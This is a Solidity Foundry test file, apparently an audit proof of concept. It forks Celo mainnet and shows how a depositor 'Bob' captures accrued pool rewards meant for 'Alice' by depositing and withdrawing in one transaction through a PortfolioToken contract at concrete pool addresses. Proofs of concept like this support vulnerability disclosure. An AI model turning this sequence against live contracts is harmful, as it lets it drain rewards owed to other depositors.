// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { IPool } from "../contracts/interfaces/IPool.sol";
import { PortfolioToken } from "../contracts/PortfolioToken.sol";

interface IPoolLike is IPool {
    function setFeeShare(uint16 feeShareBp_) external;
    function swapToVUsd(address user, uint256 amount, bool zeroFee) external;
    function swapFromVUsd(
        address user,
        uint256 amount,
        uint256 receiveAmountMin,
        bool zeroFee
    )
        external;
}

contract F01Test is Test {
    uint256 celoFork;
    IERC20 usdt = IERC20(0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e);
    IPoolLike pool = IPoolLike(0xfb2C7c10e731EBe96Dabdf4A96D656Bfe8e2b5Af);
    address poolOwner = 0x01a494079DCB715f622340301463cE50cd69A4D0;
    address poolRouter = 0x80858f5F8EFD2Ab6485Aba1A0B9557ED46C6ba0e;
    PortfolioToken cyd;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() external {
        vm.createSelectFork("https://forno.celo.org");
        cyd = new PortfolioToken("CYD", "CYD");
        cyd.setPool(0, pool);

        // Increase fee shares bps for rewards POC
        vm.prank(poolOwner);
        pool.setFeeShare(1000); // 10%

        vm.label(address(usdt), "USDT");
        vm.label(address(pool), "Pool");
        vm.label(address(cyd), "PortfolioToken");

        // Increase initial LP
        deal(address(usdt), address(this), 1_000_000 * 1e6);
        usdt.approve(address(cyd), 1_000_000 * 1e6);
        cyd.deposit(1_000_000 * 1e6, 0);

        // Setup balances
        uint256 amount = 1_000 * 1e6;
        deal(address(usdt), alice, amount);
        deal(address(usdt), bob, amount);

        // Setup approvals
        vm.prank(alice);
        usdt.approve(address(cyd), amount);

        vm.prank(bob);
        usdt.approve(address(cyd), amount);
    }

    function roundtripSwap() internal {
        // vUSD -> Asset
        vm.prank(poolRouter);
        pool.swapFromVUsd(poolRouter, 1_000 * 1e3, 0, false);
        uint256 amount = usdt.balanceOf(poolRouter);

        // Asset -> vUSD
        vm.prank(poolRouter);
        usdt.approve(address(pool), amount);

        vm.prank(poolRouter);
        pool.swapToVUsd(poolRouter, amount, false);
    }

    function simulateRewards() internal {
        for (uint256 i = 0; i < 10; i++) {
            roundtripSwap();
        }
    }

    function test_poc() external {
        uint256 amount = 1_000 * 1e6;

        // 1. Alice deposit
        vm.prank(alice);
        cyd.deposit(amount, 0);

        // 2. Simulate rewards
        simulateRewards();

        // 3. Bob steal the rewards in one tx
        // 3.a Deposit first
        vm.prank(bob);
        cyd.deposit(amount, 0);
        uint256 virtualAmount = cyd.subBalanceOf(bob, 0);

        // 3.b Withdraw
        vm.prank(bob);
        cyd.subWithdraw(virtualAmount, 0);

        uint256 balance = usdt.balanceOf(bob);
        assertGt(balance, amount);

        console.log("bob profit = %d", balance - amount);
    }
}
